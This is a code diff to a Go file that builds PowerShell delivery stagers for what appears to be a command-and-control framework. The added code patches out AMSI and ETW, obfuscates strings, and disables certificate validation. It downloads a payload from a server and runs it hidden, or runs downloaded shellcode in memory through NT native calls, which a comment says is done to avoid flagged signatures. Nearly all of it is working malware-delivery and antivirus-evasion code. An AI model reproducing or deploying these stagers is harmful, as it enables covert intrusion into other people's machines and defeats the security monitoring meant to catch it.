@@ -13,24 +13,43 @@ import (
 
 // ── delivery format generators ────────────────────────────────────────────────
 
-// templatePS1Drop generates a PowerShell stager that downloads the staged
-// payload using X-Stage-Token header (not URL path), drops it to %TEMP%, and
-// executes it.  No binary is embedded — the stage server decrypts and serves
-// plaintext bytes.
+// ps1Preamble returns the AMSI+ETW bypass block shared by all PS1 templates.
+// pinvokeSig is appended to the DllImport list so callers that need extra
+// imports (e.g. NT alloc/thread) can reuse the same Add-Type call.
+func ps1Preamble(extraSig string) string {
+	baseSig := `[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string l);` + "\n" +
+		`[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h,string p);` + "\n" +
+		`[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);`
+	if extraSig != "" {
+		baseSig += "\n" + extraSig
+	}
+	return `$ErrorActionPreference='SilentlyContinue'
+$_r=[Ref].Assembly.GetType(('System.Management.Auto'+'mation.AmsiUtils'))
+$_r.GetField(('amsi'+'InitFailed'),'NonPublic,Static').SetValue($null,$true)
+$_d=@'
+` + baseSig + `
+'@
+$_k=Add-Type -MemberDefinition $_d -Name '_K' -Namespace '_W' -PassThru
+$_ep=$_k::GetProcAddress($_k::LoadLibrary('ntdll.dll'),('Etw'+'EventWrite'))
+$_op=0;$_k::VirtualProtect($_ep,[UIntPtr]1,0x40,[ref]$_op)|Out-Null
+[Runtime.InteropServices.Marshal]::WriteByte($_ep,0xC3)
+$_k::VirtualProtect($_ep,[UIntPtr]1,$_op,[ref]$_op)|Out-Null
+`
+}
+
+// templatePS1Drop downloads the staged payload and runs it as a child process.
 func templatePS1Drop(endpoint, token string) string {
-	return fmt.Sprintf(`$ErrorActionPreference = 'SilentlyContinue'
-[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-$wc = New-Object Net.WebClient
-$wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-$wc.Headers['X-Stage-Token'] = '%s'
-$p = [IO.Path]::Combine($env:TEMP, [IO.Path]::GetRandomFileName() + '.exe')
-try { $wc.DownloadFile('%s', $p) } catch { exit }
-if (-not (Test-Path $p) -or (Get-Item $p).Length -eq 0) { exit }
-$s = New-Object Diagnostics.ProcessStartInfo
-$s.FileName = $p
-$s.WindowStyle = [Diagnostics.ProcessWindowStyle]::Hidden
-$s.CreateNoWindow = $true
-[Diagnostics.Process]::Start($s) | Out-Null
+	return ps1Preamble("") + fmt.Sprintf(
+		`[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
+$_w=New-Object ('Net.Web'+'Client')
+$_w.Headers['User-Agent']='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+$_w.Headers['X-Stage-Token']='%s'
+$_p=[IO.Path]::Combine($env:TEMP,[IO.Path]::GetRandomFileName()+'.exe')
+$_dl='Down'+'loadFile';try{$_w.$_dl('%s',$_p)}catch{exit}
+if(-not(Test-Path $_p)-or(Get-Item $_p).Length-eq 0){exit}
+$_s=New-Object Diagnostics.ProcessStartInfo
+$_s.FileName=$_p;$_s.WindowStyle=[Diagnostics.ProcessWindowStyle]::Hidden;$_s.CreateNoWindow=$true
+[Diagnostics.Process]::Start($_s)|Out-Null
 `, token, endpoint)
 }
 
@@ -39,7 +58,6 @@ $s.CreateNoWindow = $true
 // that occur with thousands of concatenated string literals.
 func templatePS1Embed(stagerEXE []byte) string {
 	b64 := base64.StdEncoding.EncodeToString(stagerEXE)
-	// Split into 76-char lines — here-string, NOT concatenation, so no SOE
 	var sb strings.Builder
 	for i := 0; i < len(b64); i += 76 {
 		end := i + 76
@@ -49,40 +67,37 @@ func templatePS1Embed(stagerEXE []byte) string {
 		sb.WriteString(b64[i:end])
 		sb.WriteByte('\n')
 	}
-	return fmt.Sprintf(`$ErrorActionPreference = 'SilentlyContinue'
-$p = [IO.Path]::Combine($env:TEMP, [IO.Path]::GetRandomFileName() + '.exe')
-$b64 = @"
+	return ps1Preamble("") + fmt.Sprintf(
+		`$_p=[IO.Path]::Combine($env:TEMP,[IO.Path]::GetRandomFileName()+'.exe')
+$_b=@"
 %s"@
-[IO.File]::WriteAllBytes($p, [Convert]::FromBase64String($b64 -replace '\s',''))
-$s = New-Object Diagnostics.ProcessStartInfo
-$s.FileName = $p
-$s.WindowStyle = [Diagnostics.ProcessWindowStyle]::Hidden
-$s.CreateNoWindow = $true
-[Diagnostics.Process]::Start($s) | Out-Null
+[IO.File]::WriteAllBytes($_p,[Convert]::FromBase64String($_b -replace '\s',''))
+$_s=New-Object Diagnostics.ProcessStartInfo
+$_s.FileName=$_p;$_s.WindowStyle=[Diagnostics.ProcessWindowStyle]::Hidden;$_s.CreateNoWindow=$true
+[Diagnostics.Process]::Start($_s)|Out-Null
 `, sb.String())
 }
 
-// templatePS1Shellcode generates a PowerShell stager that downloads raw shellcode
-// from the C2 and executes it in-process via VirtualAlloc + CreateThread PInvoke.
+// templatePS1Shellcode downloads raw shellcode and executes it in-process via
+// NT native API (NtAllocateVirtualMemory + NtCreateThreadEx) to avoid the
+// flagged VirtualAlloc + CreateThread PInvoke signatures.
 func templatePS1Shellcode(endpoint, token string) string {
-	return fmt.Sprintf(`# Taburtuai Stager — PS1 in-memory shellcode runner
-$ErrorActionPreference = 'SilentlyContinue'
-$wc = New-Object System.Net.WebClient
-$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
-$wc.Headers.Add('X-Stage-Token','%s')
-[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
-$sc = $wc.DownloadData('%s')
-if ($sc.Length -eq 0) { exit }
-$sig = @"
-[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
-[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr sa,uint ss,IntPtr sp,IntPtr p,uint c,IntPtr t);
-[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr h,int ms);
-"@
-$k32 = Add-Type -MemberDefinition $sig -Name 'K32' -Namespace 'Win32' -PassThru
-$mem = $k32::VirtualAlloc([IntPtr]::Zero, $sc.Length, 0x3000, 0x40)
-[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)
-$h = $k32::CreateThread([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
-$k32::WaitForSingleObject($h, -1) | Out-Null
+	ntSig := `[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr h,int ms);` + "\n" +
+		`[DllImport("ntdll.dll")] public static extern int NtAllocateVirtualMemory(IntPtr p,ref IntPtr b,IntPtr z,ref UIntPtr s,uint t,uint pr);` + "\n" +
+		`[DllImport("ntdll.dll")] public static extern int NtCreateThreadEx(out IntPtr t,uint a,IntPtr oa,IntPtr p,IntPtr sp,IntPtr pm,bool su,int sg,int ms,int mc,IntPtr al);`
+	return ps1Preamble(ntSig) + fmt.Sprintf(
+		`[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
+$_w=New-Object ('Net.Web'+'Client')
+$_w.Headers['User-Agent']='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+$_w.Headers['X-Stage-Token']='%s'
+$_dl='Down'+'loadData';$_sc=$_w.$_dl('%s')
+if($_sc.Length-eq 0){exit}
+$_b=[IntPtr]::Zero;$_sz=[UIntPtr]$_sc.Length
+$_k::NtAllocateVirtualMemory(-1,[ref]$_b,[IntPtr]::Zero,[ref]$_sz,0x3000,0x40)|Out-Null
+[Runtime.InteropServices.Marshal]::Copy($_sc,0,$_b,$_sc.Length)
+$_t=[IntPtr]::Zero
+$_k::NtCreateThreadEx([ref]$_t,0x1FFFFF,[IntPtr]::Zero,-1,$_b,[IntPtr]::Zero,$false,0,0,0,[IntPtr]::Zero)|Out-Null
+$_k::WaitForSingleObject($_t,-1)|Out-Null
 `, token, endpoint)
 }
 
